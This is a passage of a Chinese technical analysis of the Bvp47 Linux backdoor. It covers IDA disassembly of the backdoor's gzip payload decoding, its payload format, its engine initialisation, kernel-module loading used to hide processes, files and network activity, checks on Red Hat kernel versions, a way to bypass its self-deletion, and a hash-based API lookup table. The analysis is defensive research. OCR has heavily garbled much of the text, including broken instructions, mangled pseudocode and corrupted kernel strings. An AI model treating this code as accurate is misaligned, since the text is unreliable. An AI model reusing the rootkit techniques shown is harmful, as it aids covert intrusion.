LOAD:08056FF9 85 CO test   
LOAD:08056FFB 89C3 mov ebx, eax   
LOAD:08056FFD 0F 84 F0 00 00 00 1oc_80570F3   
LOAD:08057003 31 C0 xor   
LOAD:08057005 8D 76 00   
LOAD:08057008   
LOAD:08057008 loc_8057008:   
LOAD:08057008 C7 04 83 08 00 00 00 dword ptr [ebx+eax\*4]，8   
LOAD:0805700F 83 C0 01 add   
LOAD:08057012 3D 90 00 00 00 cmp   
LOAD:08057017 75 EF short 1oc_8057008   
LOAD:08057019 8D B4 26 00 00 00 00 lea   
LOAD:08057020   
LOAD:08057020 loc_8057020:   
LOAD:08057020 C7 04 83 09 00 00 00   
LOAD:08057027 83 C0 01 add   
LOAD:0805702A 3D 00 01 00 00   
LOAD:0805702F 75 EF short 1oc_8057020   
LOAD:08057031 8D B4 26 00 00 00 00 lea   
LOAD:08057038   
LOAD:08057038 loc_8057038:   
LOAD:08057038 C7 04 83 07 00 00 00 mov   
LOAD:0805703F 83 C0 01 add   
LOAD:08057042 3D 18 01 00 00   
LOAD:08057047 75 EF short 1oc_8057038   
LOAD:08057049 8D B4 26 00 00 00 00   
LOAD:08057050   
LOAD:08057050 loc_8057050:   
LOAD:08057050 C7 04 83 08 00 00 00 mov dword ptr [ebx+eax\*4], 8   
LOAD:08057057 83 C0 01 add   
LOAD:0805705A 3D 20 01 00 00   
LOAD:0805705F 75 EF short 1oc_8057050   
LOAD:08057061 8D 45 EC   
LOAD:08057064 BA 20 01 00 00 mov   
LOAD:08057069 89 44 24 0C mov   
LOAD:0805706D 8D 45 F4   
LOAD:08057070 B9 01 01 00 00 mov   
LOAD:08057075 89 44 24 08 mov   
LOAD:08057079 89 D8 mov eax，ebx   
LOAD:0805707B C7 45 EC 07 00 00 00   
LOAD:08057082 C7 44 24 04 A0 24 06 08 mov   
LOAD:0805708A C7 04 24 60 24 06 08   
LOAD:08057091 E8 FA EE FF FF call linux_gzip_huft_build   
LOAD:08057096 31 D2 edx,edx   
LOAD:08057098 85 CO   
LOAD:0805709A 0F 85 AA 00 00 00 1oc_805714A   
IOAD:080570AA  

linux_gzip_inflate_dynamic函数：  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

<html><body><table><tr><td>LUA0:08056A9055</td><td>pusn ebp</td><td></td></tr><tr><td>LOAD:08056A91 89 E5</td><td>mov</td><td>ebp，esp</td></tr><tr><td>LOAD:08056A93 83 EC 78</td><td>sub</td><td>esp，78h</td></tr><tr><td>LOAD:08056A96C70424F0040000</td><td>mov</td><td>dword ptr [esp]，4F0h</td></tr><tr><td>LOAD:08056A9D 895DF4</td><td>mov</td><td>[ebp+var_C],ebx</td></tr><tr><td>LOAD:08056AA0 89 7D FC</td><td>mov</td><td>[ebp+var_4], edi</td></tr><tr><td>LOAD:08056AA38 8975F8</td><td></td><td>[ebp+var_8],esi</td></tr><tr><td>LOAD:08056AA6 E8 B1 2F FF FF</td><td>mov call</td><td></td></tr><tr><td>LOAD:08056AAB 38B15445A0608</td><td></td><td>near ptr malloc-.-</td></tr><tr><td>LOAD:08056AB1 8B3D405A0608</td><td>mov</td><td>edx, ds:dword_8065A44</td></tr><tr><td>LOAD:08056AB7 83 FA 04</td><td>mov</td><td>edi，ds:dword_8065A40</td></tr><tr><td>LOAD:08056ABA 89 C3</td><td>cmp mov</td><td>edx，4 ebx，eax</td></tr><tr><td>LOAD:08056ABC 77 31</td><td>ja</td><td>short 1oc_8056AEF</td></tr><tr><td>LOAD:08056ABE A1 28 5A0608</td><td>mov</td><td>eax, ds:g_gzip_key</td></tr><tr><td>LOAD:08056AC3 BE 04000000</td><td>mov</td><td>esi,4</td></tr><tr><td>LOAD:08056AC8 3B 05245A0608</td><td>cmp</td><td>eax,ds:dword_8065A24</td></tr><tr><td>LOAD:08056ACE OF 832C010000</td><td>jnb</td><td>1oc_8056C00</td></tr><tr><td>LOAD:08056AD48B0D205A0608</td><td>mov</td><td>ecx，ds:dword_8065A20</td></tr><tr><td>LOAD:08056ADA OF B63401</td><td>movzX</td><td>esi，byte ptr[ecx+eax]</td></tr><tr><td>LOAD:08056ADE 89D1 LOAD:08056AE083 C001</td><td>mov</td><td>ecx，edx</td></tr><tr><td>LOAD:08056AE3 83 C2 08</td><td>ppe</td><td>eax，1</td></tr><tr><td>LOAD:08056AE6A3285A0608</td><td>ppe</td><td>edx，8</td></tr><tr><td>LOAD:08056AEB D3 E6</td><td>mov</td><td>ds:g_gzip_key,eax</td></tr><tr><td>LOAD:08056AED 09 F7</td><td>shl</td><td>esi,cl</td></tr><tr><td>LOAD:08056AEF</td><td>or</td><td>edi,esi</td></tr><tr><td>LOAD:08056AEF</td><td></td><td></td></tr><tr><td>LOAD:08056AEF 8D 4A FB</td><td>loc_8056AEF: lea</td><td>；CoDE XREF:1inux_gzip_inflate_dynamic+2C↑j ecx,[edx-5]</td></tr><tr><td>LOAD:08056AF2 89 F8</td><td>mov</td><td>eax，edi</td></tr><tr><td>LOAD:08056AF4 C1 E8 05</td><td>shr</td><td>eax，5</td></tr><tr><td>LOAD:08056AF783F904</td><td>cmp</td><td>ecx,4</td></tr><tr><td>LOAD:08056AFA 89 45 CC</td><td>mov</td><td>[ebp+var_34],eax</td></tr><tr><td>LOAD:08056AFD894DD0</td><td>mov</td><td>[ebp+var_30], ecx</td></tr><tr><td>LOAD:08056B00 77 3F</td><td>ja</td><td>short 1oc_8056B41</td></tr><tr><td>LOAD:08056B02 28 5A0608</td><td>mov</td><td></td></tr><tr><td>LOAD:08056B07 BE 04000000</td><td>mov</td><td>eax, ds:g_gzip_key</td></tr><tr><td>LOAD:08056B0C 3B05245A0608</td><td>cmp</td><td>esi，4</td></tr><tr><td>LOAD:08056B12 68 945D4</td><td></td><td>eax，ds:dword_8065A24</td></tr><tr><td>LOAD:08056B15 OF 83E5000000</td><td>mov jnb</td><td>[ebp+var_2c],eax</td></tr><tr><td>LOAD:08056B1B 38B4DD4</td><td></td><td>1oc_8056C00</td></tr><tr><td>LOAD:08056B1E 83C203</td><td>mov</td><td>ecx,[ebp+var_2C]</td></tr><tr><td>LOAD:08056B21 A1 20 5A 06 08</td><td>ppe</td><td>edx，3</td></tr><tr><td>LOAD:08056B260FB60408</td><td>mov</td><td>eax，ds:dword_8065A20</td></tr><tr><td>LOAD:08056B2A 0F B64DD0</td><td>movzX</td><td>eax,byte ptr [eax+ecx]</td></tr><tr><td>LOAD:08056B2E 89 55 D0</td><td>movzX</td><td>ecx,byte ptr[ebp+var_30]</td></tr><tr><td>LOAD:08056B31 D3 E0</td><td>mov sh1</td><td>[ebp+var_30],edx</td></tr><tr><td>LOAD:08056B33 09 45 CC</td><td>or</td><td>eax，cl [ebp+var_34], eax</td></tr><tr><td>LOAD:08056B36 8B 45 D4</td><td>mov</td><td>eax,[ebp+var_2C]</td></tr><tr><td>LOAD:08056B39 83 C0 01</td><td>ppe</td><td>eax，1</td></tr></table></body></html>  

linux_gzip_inflate_codes函数：  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

LUAU:08U565A5 55 eDx  
LOAD:080565A6 83 EC 5C  
LOAD:080565A9 8B35405A 06 08 esi, ds:dword_8065A40  
LOAD:080565AF 89 55 C4  
LOAD:080565B2 0F B7 94 09 20 24 06 08  
LOAD:080565BA 89 4D DC mov  
LOAD:080565BD 8B 4D 08  
LOAD:080565C0 89 45 D4 mov  
LOAD:080565C3 A1 3C 5A 06 08 mov eax, ds:dword_8065A3C  
LOAD:080565C8 8B 1D 44 5A 06 08 ebx, ds:dword_8065A44  
LOAD:080565CE 89 55D8  
LOAD:080565D1 0F B7 8C 09 20 24 06 08  
LOAD:080565D9 89 45 D0  
LOAD:080565DC 89 4DC8  
LOAD:080565DF  
LOAD:080565DF  
LOAD:080565DF  
LOAD:080565DF 3B 5D DC  
LOAD:080565E2 73 35 short 1oc_8056619  
LOAD:080565E4  
LOAD:080565E4 loc_80565E4:  
LOAD:080565E4 8B 15 28 5A 06 08 mov  
LOAD:080565EA 3B 15 24 5A 06 08 edx, ds:dword_8065A24  
LOAD:080565F0 0F 83 22 01 00 00  
LOAD:080565F6 A1 205A 0608 eax, ds:dword_8065A20  
LOAD:080565FB 89D9  
LOAD:080565FD 83 C3 08 add  
LOAD:08056600 0F B6 04 10  
LOAD:08056604 83 C2 01 add  
LOAD:08056607 89 1528 5A 06 08  
LOAD:0805660D 0F B6 CO movzx  
LOAD:08056610 D3 E0  
LOAD:08056612 09 C6  
LOAD:08056614 3B 5D DC  
LOAD:08056617 72 CB short 1oc_80565E4  
LOAD:08056619  
LOAD:08056619 loc_8056619:  
LOAD:08056619 8B 45D8  
LOAD:0805661C 8B 55 D4  
LOAD:0805661F 21 F0 and  
LOAD:08056621 8D 04 C2  
LOAD:08056624 0F B6 08 movzx ecx, byte ptr [eax]  
LOAD:08056627 89 45 E0  
LOAD:0805662A 83 F9 10 cmp  
LOAD:0805662D 89 4D E4 mov  
LOAD:08056630 0F 86 22 01 00 00 jbe 1oc_8056758  
LOAD:08056636 83 F9 63 cmp  
LOAD:08056639 0F 84 18 04 00 00 1oc_8056A57  
LOAD:0805663F A1 20 5A 06 08 eax, ds:dword_8065A20  
LOAD:08056644 8B 3D 24 5A 06 08 mov edi,ds:dword_8065A24  
LOAD:0805664A 89 45 CC  
LOAD:0805664D A1 285A 0608  
LOAD:08056652  
LOAD:08056652 loc 8056652:  

linux_gzip_fill_buf函数：  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

LOAD:080564E0 55 ebp   
LOAD:080564E1 89 E5   
LOAD:080564E3 57 push edi   
LOAD:080564E4 56 push   
LOAD:080564E5 53 push   
LOAD:080564E6 83 EC 2C   
LOAD:080564E9 8B 35 3C 5A 06 08 mov esi, ds:dword_8065A3C   
LOAD:080564EF 8B 1D 2C 5A 06 08 ebx, ds:dword_8065A2C   
LOAD:080564F5 85 F6   
LOAD:080564F7 75 27 short 1oc_8056520   
LOAD:080564F9   
LOAD:080564F9 loc_80564F9:   
LOAD:080564F9   
LOAD:080564F9 89 1D 2C 5A 06 08 ds:dword_8065A2C, ebx   
LOAD:080564FF 31 C0 eax, eax   
LOAD:08056501 01 35 30 5A 06 08 add ds:dword_8065A30, esi   
LOAD:08056507 C7 05 3C 5A 06 08 00 00 00 00 ds:dword_8065A3C,0   
LOAD:08056511 83 C4 2C add   
LOAD:08056514 5B pop ebx   
LOAD:08056515 5E pop   
LOAD:08056516 5F pop edi   
LOAD:08056517 5D pop ebp   
LOAD:08056518 C3 retn   
LOAD:08056518   
LOAD:08056520   
LOAD:08056520 loc_8056520:   
LOAD:08056520 8B 3D 38 5A 06 08 edi，ds:dword_8065A38   
LOAD:08056526 A1 34 5A 06 08 mov eax, ds:dword_8065A34   
LOAD:0805652B 8D 14 37 edx, [edi+esi]   
LOAD:0805652E 89 54 24 04 mov   
LOAD:08056532 89 55 E4 mov   
LOAD:08056535 89 04 24 [esp], eax   
LOAD:08056538 E8 93 A3 00 00 call serial_bind_0x74e5f2a8_   
LOAD:0805653D 8B55 E4   
LOAD:08056540 85 CO test   
LOAD:08056542 74 21 short 1oc_8056565   
LOAD:08056544 A3 34 5A 06 08 ds:dword_8065A34, eax   
LOAD:08056549 01 F8 add eax,edi   
LOAD:0805654B 89 15 38 5A 06 08 ds:dword_8065A38, edx   
LOAD:08056551 89 74 24 08 mov   
LOAD:08056555 C7 44 24 04 80 5E 06 08 dword ptr [esp+4], offset byte_8065E80 LOAD:0805655D 89 04 24   
LOAD:08056560 E8 87 35 FF FF near ptr memmove_.   
LOAD:08056565   
LOAD:08056565 loc_8056565:   
LOAD:08056565 8B 35 3C 5A 06 08 mov esi, ds:dword_8065A3C  

linux_gzip_huft_build函数：  

#### “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/5c59dbaa130589a9ce9f81e0723c313b77cb5717ebb7d412ac903522abffbe75.jpg)  

# 整体抽象出来的大致C语言代码如下（未能完全覆盖）：  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/c1b9733787c76d598de6eb1231e918eda2c152073e47a3aa9bbe56c6bd55cbc1.jpg)  

已知的payload文件格式如下：  

typedef struct serial_section_information uint8 magic[0x10]; uint8 f0; uint8 f1; uint32 reversed; uint32 dst_size; uint32 src_size; uint32 check_sum;   
serial_section_information;  

在实际样本运行过程中，在上述Decode回调调用过程中也会直接开始尝试加载so类型的文件：  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/01a9e615d2652ff7ffff790d7e505d429803321f5aa4cb10389f9a06fc021b61.jpg)  

在试图加载后也会去尝试补丁elf文件格式的plt：  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/05415312730f38dd2dca36daf94c9ff27a1c67334eb82ae3826a33e0c4015cab.jpg)  

### Bvp引擎初始化与内核模块加载  

内核模块的解密与加载也会在main流程里执行，会经历如下的几个步骤：  

1. 解密payload包；  
2. 初始化Bvp引擎，适配对应内核版本结构；  
3. 开始尝试装载ko模块，主要用于进程、文件、网络的隐藏等；  
具体如下：  
1. 尝试解密ko的payaload；  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/06a1ca75010f8ad0b5ae60a5cedf8e64aaf7e6e80875a33e8cd1eb31c02fb52b.jpg)  

2. Bvp整体处理函数；  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/573019ab3e4353f006430dae34134ec506a117603b19d79d6535ce719b01a244.jpg)  

#### 对应的伪代码：  

2{ int result; // eax ELF_API_0x08052A40 $=$ return serial_bvp(a2, a1[1], a1[2]); $\lor4=$ serial_bvp_sym(); $=0$ $^{\circ}$ if（ $\vee4==1$ $^{\circ}$ $=$ serial_Bvp_sym(a2);  

3. Bvp引擎的初始化serial_bvp函数  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

<html><body><table><tr><td></td></tr><tr><td>LOAD:080589B0 LOAD:080589B0 55</td></tr><tr><td>push ebp</td></tr><tr><td>LOAD:080589B1 89 E5 mov ebp,esp LOAD:080589B3 81 EC 38010000 sub esp,138h</td></tr><tr><td>LOAD:080589B9 8D 85 10 FF FF FF lea eax,[ebp+buffer]</td></tr><tr><td>LOAD:080589BF 895DF4 mov [ebp+var_C],ebx</td></tr><tr><td>L0AD:080589C28B1DACDE0608 mov ebx,ds:ELF_API_0x08052A40</td></tr><tr><td>LOAD:080589C8 68 75F8 mov [ebp+var_8], esi</td></tr><tr><td>L0AD:080589CB 8D B5DFFEFFFF lea esi,[ebp+var_121]</td></tr><tr><td></td></tr><tr><td>LOAD:080589D18 68 7DFC mov [ebp+var_4],edi</td></tr><tr><td>LOAD:080589D4C7 45 E400098000 mov [ebp+var_1c],0 L0AD:080589DB C7 45 0000000 [ebp+var_20],0</td></tr><tr><td>mov LOAD:080589E2 C7 45 DCQ mov [ebp+var_24],0</td></tr><tr><td>L0AD:080589E9 C745 D80000000 mov [ebp+var_28],0</td></tr><tr><td>LOAD:080589F0 C745D400000000 mov [ebp+var_2C],θ</td></tr><tr><td>L0AD:080589F7 C7 44 24081C000000 mov dword ptr[esp+8],1ch；length</td></tr><tr><td>LOAD:080589FF C7 44240474260608 mov dword ptr [esp+4], offset aBvp_sym_devmem_is_allowed ;"Bvp_sym_devmem_is_allowed"</td></tr><tr><td>LOAD:08058A07 89 04 24 mov [esp], eax ；dst</td></tr><tr><td>LOAD:08058A0A E8 C1 71 00 00 call serial_bind_0xa8a16d65_xcode</td></tr><tr><td>L0AD:08058A0F FC744246409080000 mov dword ptr [esp+4],①</td></tr><tr><td>LOAD:08058A17 89 44 24 08 mov [esp+8],eax</td></tr><tr><td>LOAD:08058A1B 8D 45 E4 lea eax,[ebp+var_1c]</td></tr><tr><td>LOAD:08058A1E 89 04 24 mov [esp],eax</td></tr><tr><td>L0AD:08058A21 FF D3 call ebx;ELF_API_0x08052A40</td></tr><tr><td>L0AD:08058A23 31 DB xor ebx，ebx</td></tr><tr><td>L0AD:08058A25 85 C0 test eax,eax</td></tr><tr><td>LOAD:08058A27 75 5F jnz short 1oc_8058A88</td></tr><tr><td>LOAD:08058A29 8B 45 E4 mov eax,[ebp+var_1c]</td></tr><tr><td>LOAD:08058A2C 85 C0 test eax,eax</td></tr><tr><td>LOAD:08058A2E 74 58 jz short 1oc_8058A88</td></tr><tr><td>LOAD:08058A30 83 F8 FF cmp eax, OFFFFFFFFh</td></tr><tr><td>LOAD:08058A33 74 53 jz short 1oc_8058A88</td></tr><tr><td>L0AD:08058A35 8D85 41FF FF FF lea eax,[ebp+dst] L0AD:08058A3B 8B 3DACDE0608 mov edi，ds:ELF_API_0x08052A40</td></tr><tr><td>LOAD:08058A41 C7 44240820000000 mov dword ptr [esp+8],20h; ；length</td></tr><tr><td>L0AD:08058A49 C7 44240494260608 mov dword ptr [esp+4],offset aBvp_config_linux_version_code;"Bvp_config__LINUX_VERSIoN_coDE"</td></tr><tr><td>L0AD:08058A51 890424 mov [esp],eax ；dst</td></tr><tr><td>LOAD:08058A54 E8 77710000 call serial_bind_0xa8a16d65_xcode</td></tr><tr><td>L0AD:08058A59C7 44240400000000 mov dword ptr [esp+4],0</td></tr><tr><td>LOAD:08058A61 8 89 9442408 mov [esp+8],eax</td></tr><tr><td>L0AD:08058A65 8D 45 E0 lea eax,[ebp+var_20]</td></tr><tr><td>LOAD:08058A68 89 04 24 mov [esp],eax</td></tr><tr><td>LOAD:08058A6B FF D7 call edi；ELF_API_0x08052A40</td></tr><tr><td>LOAD:08058A6D 85 C0 test eax，eax</td></tr><tr><td>LOAD:08058A6F 75 17 jnz short 1oc_8058A88</td></tr><tr><td>LOAD:08058A71 8B 45 E0 mov eax,[ebp+var_20]</td></tr><tr><td>LOAD:08058A74 83 F8 FF cmp eax,OFFFFFFFFh</td></tr><tr><td>LOAD:08058A77 74 0F jz short 1oc_8058A88</td></tr><tr><td>L0AD:08058A793D19060200 cmp eax，20619h</td></tr><tr><td>L0AD:08058A7EBB01000000 mov ebx，1</td></tr><tr><td>L0AD:08058A83 76 13 jbe short 1oc_8058A98</td></tr><tr><td>LOAD:08058A85 8D 76 00 lea esi,[esi+0]</td></tr></table></body></html>  

对应的伪代码：  

61   
$v{\theta}=$   
$\vee22[\Theta]=\Theta.$   
$\vee21=\Theta_{\mathrm{i}}$   
$v20=\Theta.$   
$\vee19=\Theta,$   
$\vee18=\Theta_{\scriptscriptstyle}$   
$\begin{array}{r l}{{}\mathbf{\nabla}\mathbf{\psi}_{\mathrm{~l~}}^{}=}\end{array}$   
$\begin{array}{r l}{{\mathsf{v}}2}&{{}=}\end{array}$ $\mathsf{v1}$   
$v_{3}=\theta_{\cdot}$ { { $\downarrow4=$ $v5~=$ $\vee3~=~1$ { $v7=$ $\vee8=$ $\begin{array}{r l}{{}\mathbf{\nabla}\vee9}&{{}=}\end{array}$ $\l=$ $\vee11=$ $\vee12=$ $\mathfrak{L}=~1$ LOBYTE( $\vee3)=\vee18==1$  

4. serial_bvp流程  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/bf96c570d110173cd2124429069be74a2122c8fbf3bc814eb9e8d85f1ba025f1.jpg)  

#### 5. 加载第一个模块qmr  

“电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘$=\theta.$   
{$v3=-1.$ if （ !serial_bind_0x4743c911_xor(g_elf_buf, g_elf_len))goto LABEL_5;g_elf_decode $=~1$   
}  
$v3=$   
{$v3=$ {$v3=-1;$ $\vee117=\Theta_{\mathrm{j}}$ $\vee118=\Theta$ $v5=$ $=0$ $=0$ $v_{0}~=~v_{2}$ {$v7=$ _DWORD，int))ELF_API_0x08052A40;$=$ $v3=$ {$\equiv$ serial_bind_0xa8a16d65_xcode(v100,"Bvp_const__MODULE_NAME_LEN"， 28);$v3=$ {else  

6. 校验发行版：  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/f04ed1c0e97fe73db82ae3157dff93db6912f194a36fc2a1e9b4548b4fb6d73c.jpg)  

#### 7. 该发行版对应了TSB中的版本：  

4.1 Linux version 2.6.9-11.EL(bhcompile@decmose,build.redhat.com)(gccversion3.4.320050227(Red Hat 3.4.3-22)1FriMay 2018:17:57EDT205   
4.2Linuxversion2.6.9-22.EL（bhcompile@porky.build.redhat.com）（gccversion3.4.420050721（Red Hat3.4.4-2)#1Mon Sep1918:20:28EDT2005   
4.3 Linux version 2.6.9-34.EL(bhcompile@hs20-bc1-7.build.redhat.com)(gcc version 3.4.520051201（Red Hat 3.4.5-2))#1 Fri Feb 24 16:44:51 EST 2006   
4.4 Linux version 2.6.9-42.EL （bhcompile@hs20-bc1-1.build.redhat.com)(gcc version 3.4.6 20060404（Red Hat 3.4.6-2))#1 Wed Jul 12 23:16:43 EDT 2006   
4.5 Linux version 2.6.9-55.EL （brewbuilder@ls20-bc2-14.build.redhat.con)(gcc version 3.4.620060404 （Red Hat 3.4.6-3))#1Fri Apr 20 16:35:59 EDT 2007   
4.6 Linux version 2.6.9-67.EL （brewbuilder@ls20-bc1-14.build.redhat.con) (gcc version 3.4.620060404 (Red Hat 3.4.6-8)) #1 Wed Nov 7 13:41:13 EST 2007   
4.7Linux version2.6.9-78.EL（brewbuilder@hs20-bc2-3.build.redhat.com)(gccversion 3.4.620060404（Red Hat 3.4.6-10))#1Wed Jul9 15:27:01 EDT2008   
4.8 Linux version 2.6.9-89.EL (mockbuild@hs20-bc1-2.build.redhat.com) (gcc version 3.4.6 20060404 （Red Hat 3.4.6-11)) #1 Mon Apr 20 10:23:08 EDT 2009  

f75835f359ef8f26a8f58c113ac7fdco fe80fc7ebfb9db7075e9e0fb0c770bfd 3e7a8cc0c25e882570eca080d8349c92 b5b678cf805b3b09581303786d01d8cf df61eade798c73b3856695a695cb227at ed4c725e19754e64cf046a245d265501 28fbd4d2772ac82473cd562c5d9df3d6 8debe58a1f60754d305aa3bf01136a65  

4.1 Linux version 2.6.9-11.ELsmp (bhcompile@dec ose.build.redhat.com)(gcc version 3.4.3 20050227（Red Hat 3.4.3-22)) #1 SMP Fri 18:26:27 EDT 2005 a71048d6369a67956428d0b02d2c752d 354bf 83c30b21b928f15fdd959a389a064   
4.5Linuxvers1on2.6.9-55.ELsmp（brewbuilder@ls20-bc2-14.bu1ld.redhat.com） gcc 404（RedHat3.4.6-3））#1SMPFriApr2017:03:35EDT2007 e5127b3e3b1639fc8d231c78b   
4 623272126693c859ca 6233d72d26f693c859ca0ab5bee1fc37 23f8c30154c640c90305073ddcace4b6   
4.8Linux version 2.6.9-89.ELsmp（mockbuildehs20-bc1-2.build.redhat.com)（g version 3.4.620060404（Red Hat 3.4.6-11))#1 7759efcea928377e9cd30d5ccab757b5\*  

#### 8.校验2：  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

$=$ $v3=$ { $=\Theta_{\cdot}$ ； $=\theta_{\cdot}$ $=$ 0; $=$ $\Bumpeq$ $=$ $=$ $v3=$ goto LABEL_5; $\Bumpeq$ $=$ $v3=$ goto LABEL_5; ${}={}$ $=$ $v3=$ goto LABEL_5; { { do if（\*v45 !=0x1DC665AE) goto LABEL_41; 1  

9. 内核模块加载时的参数验证1：  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/bce94b9d454c8cea2854c75159e91dd1827e8adc3c2a706c92d1c6c12c19d042.jpg)  

10. 内核模块2加载时的参数验证2：  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

11. 最终开始装载内核模块：  

goto LABEL_5; $\l=$ $v3~=~\lor49$  

### 自删除的一种绕过手段  

在main函数中有2处unlink函数的调用，实际调试过程中可以暴力修改流程绕过unlink所出现的自删除：  

<html><body><table><tr><td colspan="5">xrefs to unlink 口 ×</td></tr><tr><td></td><td colspan="3"></td></tr><tr><td>Directic Ty Address</td><td>Text</td><td></td><td></td></tr><tr><td>Up p serial_mkstemp+3C Up main+11B</td><td>call near ptr unlink_. call near ptr unlink</td></tr><tr><td>p Up p main+366</td><td>call nearptrunlink</td></tr><tr><td>p main+37B call</td><td></td></tr><tr><td>p main+9E2</td><td>near ptr unlink_. call near ptr unlink_.</td></tr><tr><td>p main+9F3 call</td><td>near ptr unlink_..</td></tr><tr><td>p sub_804D590+73 p sub_804DB60+35</td><td>call near ptr unlink call near ptr unlink_.</td></tr><tr><td>D... P sub_804E1A0+8F call</td><td>near ptr unlink</td></tr><tr><td>D... p sub804E660+221</td><td>call near ptr unlink_.</td></tr><tr><td>D... p sub_805B9B0+246 call D... 0 LOAD:off8063200</td><td>near ptr unlink_.</td></tr><tr><td>Line 3 of 12</td><td>ddoffsetunlink.field6</td></tr></table></body></html>  

#### 基于Hash的API函数调用  

在Bvp47的运行过程会有制作一张类似作基于Hash值的API函数查找的查找表。  

1. 面对如下的一张Hash表；  

<html><body><table><tr><td colspan="2">Address</td><td>Length</td><td>Type</td><td>String</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>9a98cf3e</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>29b5e7f0</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>97413c51</td></tr><tr><td></td><td>LOAD:08060...</td><td>60000000</td><td>C</td><td>3955ced4</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>278dec7a</td></tr><tr><td></td><td>LOAD:08060...</td><td>60000000</td><td>C</td><td>d1eb34ee</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>191ea6d2</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>4b6c29bf</td></tr><tr><td></td><td>LOAD:08060...</td><td>60000000</td><td>C</td><td>78f2b4b4</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>1e30bd94</td></tr><tr><td></td><td>LOAD:08060...</td><td>60000000</td><td>C</td><td>da78b246</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>8bdfc33f</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>1a7a7356</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>8c27e8f7</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>92e5c0d8</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>2cd7cd5e</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>1bd919bb</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>c</td><td>d0c6bfeb</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>90bff64c</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>531ab53f</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>c949df79</td></tr><tr><td></td><td>LOAD:08060...</td><td>60000000</td><td>C</td><td>3bcaaa8c</td></tr></table></body></html>  

<html><body><table><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>c</td><td>19282364</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>ad776cf9</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>c</td><td>0e56f7ab</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>b219d9e5</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>68cab24f</td></tr><tr><td></td><td>LOAD:08060...</td><td>60000000</td><td>C</td><td>b064f130</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>388b7075</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>c</td><td>7bbf2c88</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>e6342921</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>bfdc5cb1</td></tr><tr><td></td><td>LOAD:08060...</td><td>60000000</td><td>C</td><td>628daa78</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>43f710cc</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>7ba772b8</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>59422f01</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>25b78822</td></tr><tr><td></td><td>LOAD:08060...</td><td>60000000</td><td>C</td><td>47c2cb27</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>89436336</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>7f493fb8</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>f265883c</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>5b19bf75</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>44624440</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>c767b324</td></tr><tr><td></td><td>LOAD:08060...</td><td>00000009</td><td>C</td><td>e7a87594</td></tr